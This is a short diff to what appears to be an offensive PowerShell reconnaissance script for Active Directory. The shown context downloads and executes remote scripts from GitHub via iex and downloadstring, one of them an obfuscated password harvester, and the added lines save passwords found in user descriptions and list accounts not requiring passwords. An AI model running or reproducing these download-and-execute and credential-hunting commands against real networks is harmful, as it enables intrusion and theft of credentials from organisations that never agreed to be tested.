@@ -1519,7 +1519,10 @@ function domainreconmodules
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')            
     
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
+
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
+
+            Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPassword.txt"
 
             Write-Host -ForegroundColor Yellow 'Searching for Users without password Change for a long time'
 	        $Date = (Get-Date).AddYears(-1).ToFileTime()
